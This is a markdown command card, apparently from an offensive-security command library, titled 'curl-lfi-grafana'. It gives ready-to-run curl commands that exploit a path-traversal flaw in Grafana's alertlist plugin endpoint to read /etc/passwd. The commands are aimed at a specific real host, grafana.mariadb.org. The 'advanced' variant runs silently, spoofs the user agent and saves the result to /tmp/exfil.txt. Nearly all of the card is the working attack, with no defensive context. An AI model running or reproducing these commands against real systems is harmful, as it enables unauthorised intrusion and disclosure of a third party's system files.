---
data: >-
  curl
  "https://grafana.mariadb.org/public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../etc/passwd"
  -o output.txt
tags:
  - lfi
  - recon
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
id: 79f721c9-f3f8-476e-b8d4-81a8b5c3fe2e
created_at: '2025-12-14T17:26:27.296Z'
updated_at: '2025-12-14T17:26:27.296Z'
verified: false
validated: true
submitted: true
---
# curl-lfi-grafana

## Command

```bash
curl "https://grafana.mariadb.org/public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../etc/passwd" -o output.txt
```

## Description

This command uses curl to send a GET request to the vulnerable Grafana alertlist endpoint with a path traversal payload, attempting to read and download the /etc/passwd file for information disclosure.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | The crafted endpoint URL with traversal | Yes |
| -o | Output file to save the response | No |

## Examples

### Basic Usage

```bash
curl "https://grafana.mariadb.org/public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../etc/passwd"
```

### Advanced Usage

```bash
curl -s "https://grafana.mariadb.org/public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../etc/passwd" -o /tmp/exfil.txt -H "User-Agent: Mozilla/5.0"
```

## Expected Output

The command outputs the contents of /etc/passwd if successful, such as lines listing users (e.g., 'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin'). Saved to output.txt for offline review. Failure may return HTML error pages or empty responses.

## Related

- [[Related Procedure|procedures/Exploit-LFI-in-Grafana-Alertlist-Endpoint]]
